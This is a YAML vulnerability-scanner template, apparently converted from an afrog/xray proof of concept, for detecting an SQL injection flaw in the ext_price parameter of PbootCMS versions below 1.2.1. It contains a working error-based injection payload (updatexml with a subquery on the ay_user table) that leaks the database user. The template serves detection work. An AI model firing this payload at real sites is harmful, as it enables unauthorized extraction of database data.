# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - XPATH syntax error
          - 执行SQL发生错误
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123'
id: pbootcms-ext-price-sql-injection
info:
  author: daffainfo
  description: PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息.漏洞影响:PbootCMS < 1.2.1  app="PBOOTCMS"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: PbootCMS ext_price SQL 注入漏洞
  severity: critical
  tags: pbootcms,pboot,sqli,argus-import
